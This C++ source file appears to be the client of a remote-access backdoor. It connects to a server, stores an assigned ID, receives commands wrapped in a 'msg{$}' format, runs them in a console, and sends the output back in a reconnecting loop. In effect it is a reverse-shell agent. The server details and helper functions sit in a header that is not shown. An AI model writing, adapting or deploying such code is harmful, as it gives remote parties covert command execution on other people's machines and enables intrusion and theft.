#include "addition.h"

using namespace mySTL;

int main()
{
    char *str;
    SOCKET *sock = nullptr;
    SOCKET *responseSock = nullptr;
    sockaddr_in *addr;
    char *id = nullptr;
    char *msg;
    int isStart = false;
    if ( (id = readFromFile(ID_FILE_NAME)) == nullptr )
    {
        id = mySTL::addStr(id, "-1");
    }
    char *output = nullptr;
    addr = initPreConnection();
    sock = initConnection(addr);
    sendRequest(sock, id);
    str = readHeader(sock);
    while ( true )
    {
        if ( mySTL::strcmp(str, "") && str != nullptr )
        {
            printf("\nClosed\n");
            closesocket(*sock);
            free(sock);
            sock = initConnection(addr);
            sendRequest(sock, id);
            readHeader(sock);
            continue;
        }
        //if (c != 0)
        //printf("%c", c);
        unsigned int lenStr = mySTL::strlen(str);
        for (int i = 0; i < lenStr ; i++)
        {
            if ( (msg = mySTL::extractMsg(str[i], "msg{$}")) != nullptr )
            {
                //printf("%s", msg);
                if ( msg[mySTL::strlen(msg)-1] == '#')
                {
                    msg[mySTL::strlen(msg)-1] = 0;
                    free(id);
                    id = nullptr;
                    id = mySTL::addStr(id, msg);
                    writeToFile(ID_FILE_NAME, id);
                    closesocket(*sock);
                    free(sock);
                    goto endLoop;
                }
                if ( mySTL::strcmp(msg, "&ping") == false )
                {
                    isStart = execCommand(msg);
                    //printf("%s", output);
                    break;
                }
            }
        }
        if (str != nullptr)
        {
            free(str);
            str = nullptr;
        }

        if (isStart == true)
        {
            output = readConsoleOutput(hReadPipe1);

        }
        if ( output != nullptr )
        {
            if (responseSock != nullptr)
            {
                closesocket(*responseSock);
                free(responseSock);
            }

            printf("output: %s", output);
            responseSock = initConnection(addr);
            sendConsoleOutput(responseSock, output, id);
            Sleep(1);
            free(output);
            output = nullptr;
        }
        Sleep(LOOP_TIME_WAIT);
endLoop:
        str = listenData(sock);
    }
}
